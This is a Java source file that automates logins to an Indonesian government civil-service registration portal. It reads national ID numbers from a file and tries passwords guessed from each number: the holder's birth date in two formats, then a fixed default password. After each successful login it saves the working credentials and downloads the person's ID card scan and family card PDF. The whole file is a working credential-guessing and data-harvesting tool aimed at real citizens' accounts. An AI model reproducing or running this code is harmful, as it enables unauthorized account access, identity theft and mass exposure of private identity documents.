package com.fjr.parigimoutong._2019.kartu_keluarga;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.URL;

import org.apache.commons.io.FileUtils;

import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

public class DownloadKartuKeluarga {
	
	BufferedReader reader = null; 
	
	PrintWriter out  = null, out1 = null ; 
	
	public DownloadKartuKeluarga() {
		
	}
	
	public DownloadKartuKeluarga(String fileInput, String fileOutput  ) {
		String content = null; 
		HtmlPage page1 = null;
		WebClient webClient = new WebClient();
		webClient.getCookieManager().clearCookies();
		webClient.getOptions().setJavaScriptEnabled(false);
		webClient.getOptions().setCssEnabled(false);
		try {
			out = new PrintWriter(new FileOutputStream ( "./" +  fileOutput )); 
			out1 = new PrintWriter(new FileOutputStream ("./log.txt"  )); 
			reader = new BufferedReader(new FileReader( "./" + fileInput   ));
			
			String dir = "./foto/"; 
			File f = new File(dir); 
			dir = f.getAbsolutePath();
			if(f.exists()) {
				FileUtils.deleteDirectory(f);
			}
			f.mkdir(); 
			
			while((content = reader.readLine() ) != null) {	
				try {
					out1.println(content); 
					out1.flush();
					page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
					
					String nik = content;
					String old_tanggal = convertNikWanita(nik, false); 
					
					HtmlForm form = (HtmlForm) page1.getElementById("FormLogin"); 
					HtmlInput name = form.getInputByName("username"); 

					name.setValueAttribute(nik); 
					HtmlInput passwordForm = form.getInputByName("password"); 
					passwordForm.setValueAttribute(old_tanggal); 
					HtmlButton button = (HtmlButton) page1.getElementById("btnSimpan"); 
					HtmlPage page2 = button.click();
					String result = page2.asText(); 
					if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
							! result.toLowerCase().contains("bad credential")) {
						out.println(nik + "|" + old_tanggal);  
						out.flush();
						
						
						String dirName = dir  + "/" +  nik + "/"; 
						File ff = new File(dirName);  
						if( ff.exists()) {
							FileUtils.deleteDirectory(f);
						}
						ff.mkdir(); 
						dirName = ff.getAbsolutePath();
												
						Page page = webClient.getPage
								("https://sscndaftar.bkn.go.id/resume/buka.blob?jenisDokumen=2");
						InputStream inputStream = page.getWebResponse().getContentAsStream(); 
						FileOutputStream outputStream = new FileOutputStream(dirName + "/" + "ktp.jpg");
			            int read = 0;
			            byte[] bytes = new byte[1024];

			            while ((read = inputStream.read(bytes , 0, 1024)) != -1) {
			                outputStream.write(bytes, 0, read);
			            }
			            outputStream.close();
						page = webClient.getPage
								("https://sscndaftar.bkn.go.id/resume/buka.blob?jenisDokumen=6");
						inputStream = page.getWebResponse().getContentAsStream(); 
						outputStream = new FileOutputStream(dirName + "/" + "kk.pdf");
			            while ((read = inputStream.read(bytes , 0, 1024)) != -1) {
			                outputStream.write(bytes, 0, read);
			            }
			            outputStream.close();
						continue; 
					}

					old_tanggal = convertNikWanita(nik, true); 
					page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
					
					form = (HtmlForm) page1.getElementById("FormLogin"); 
					name = form.getInputByName("username"); 

					name.setValueAttribute(nik); 
					passwordForm = form.getInputByName("password"); 
					passwordForm.setValueAttribute(old_tanggal); 
					button = (HtmlButton) page1.getElementById("btnSimpan"); 
					page2 = button.click();
					result = page2.asText(); 
					if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
							! result.toLowerCase().contains("bad credential")  
							) {
						out.println(nik + "|" + old_tanggal);  
						out.flush();
						
						String dirName = dir  + "/" +  nik + "/"; 
						File ff = new File(dirName);  
						if( ff.exists()) {
							FileUtils.deleteDirectory(f);
						}
						ff.mkdir(); 
						dirName = ff.getAbsolutePath();
						
						Page page = webClient.getPage
								("https://sscndaftar.bkn.go.id/resume/buka.blob?jenisDokumen=2");
						InputStream inputStream = page.getWebResponse().getContentAsStream(); 
						FileOutputStream outputStream = new FileOutputStream(dirName + "/" + "ktp.jpg");
			            int read = 0;
			            byte[] bytes = new byte[1024];

			            while ((read = inputStream.read(bytes , 0, 1024)) != -1) {
			                outputStream.write(bytes, 0, read);
			            }
			            outputStream.close();
			            
						page  = webClient.getPage
								("https://sscndaftar.bkn.go.id/resume/buka.blob?jenisDokumen=6");
						inputStream = page.getWebResponse().getContentAsStream(); 
						outputStream = new FileOutputStream(dirName + "/" + "kk.pdf");
			            while ((read = inputStream.read(bytes, 0, 1024)) != -1) {
			                outputStream.write(bytes, 0, read);
			            }
			            outputStream.close();
						continue; 
					}
					
					old_tanggal = "09huiIll"; 
					
					page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
					
					form = (HtmlForm) page1.getElementById("FormLogin"); 
					name = form.getInputByName("username"); 

					name.setValueAttribute(nik); 
					passwordForm = form.getInputByName("password"); 
					passwordForm.setValueAttribute(old_tanggal); 
					button = (HtmlButton) page1.getElementById("btnSimpan"); 
					page2 = button.click();
					result = page2.asText();
					if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
							! result.toLowerCase().contains("bad credential")  
							) {
						out.println(nik + "|" + old_tanggal);  
						out.flush();
						
						String dirName = dir   + "/" +  nik + "/"; 
						File ff = new File(dirName);  
						if( ff.exists()) {
							FileUtils.deleteDirectory(f);
						}
						ff.mkdir(); 
						dirName = ff.getAbsolutePath();
						
						Page page = webClient.getPage
								("https://sscndaftar.bkn.go.id/resume/buka.blob?jenisDokumen=2");
						InputStream inputStream = page.getWebResponse().getContentAsStream(); 
						FileOutputStream outputStream = new FileOutputStream(dirName + "/" + "ktp.jpg");
			            int read = 0;
			            byte[] bytes = new byte[1024];
			            while ((read = inputStream.read(bytes, 0, 1024)) != -1) {
			                outputStream.write(bytes, 0, read);
			            }
			            outputStream.close();
						page = webClient.getPage
								("https://sscndaftar.bkn.go.id/resume/buka.blob?jenisDokumen=6");
						inputStream = page.getWebResponse().getContentAsStream(); 
						outputStream = new FileOutputStream(dirName + "/" + "kk.pdf");
			            while ((read = inputStream.read(bytes, 0, 1024)) != -1) {
			                outputStream.write(bytes, 0, read);
			            }						
			            outputStream.close();
						continue; 
					}

				}catch(Exception e) { 
					System.out.println("salah di loop"); 
					System.out.println(e.getMessage()); 
					continue; 
				}
			}
		}catch(Exception e) {
			e.printStackTrace();
		}finally {
			if(out != null) {
				out.close();
			}
			if(out1 != null) {
				out1.close();
			}
		}
		
		System.out.println("FINISH"); 
	}
	
	
	public String convertNikWanita(String nik , boolean includeYearPrefix) {
		String nik_ = nik.substring(6,12); 
		int tgl_ktp = Integer.valueOf(nik_.substring(0,2)); 
		if( tgl_ktp > 40) {
			tgl_ktp  = tgl_ktp - 40 ;
		}
		String tgl_ktp_str = Integer.toString(tgl_ktp);
		if(tgl_ktp_str.length() == 1) {
			tgl_ktp_str = "0".concat(tgl_ktp_str);
		}
		String bulan_ktp_str = nik_.substring(2,4); 
		String tahun_ktp_str = nik_.substring(4,6)  ;
		if( includeYearPrefix) {
			tahun_ktp_str = "19".concat( tahun_ktp_str ) ;
		}
		String tgl_final = tgl_ktp_str.concat( bulan_ktp_str ).concat( tahun_ktp_str );
		return tgl_final; 
	}
	
	public void downloadToDir(String link, String dir) {
		try ( BufferedInputStream inputStream = new BufferedInputStream(
				new URL(link).openStream());
				FileOutputStream fileOS = new FileOutputStream(dir)) {
			byte data[] = new byte[1024];
			int byteContent;
			while ((byteContent = inputStream.read(data, 0, 1024)) != -1) {
				fileOS.write(data, 0, byteContent);
			}
		} catch (IOException e) {
		}
	}

	public static void main(String[] args) {
		new DownloadKartuKeluarga(args[0] , args[1]);  
	}
}
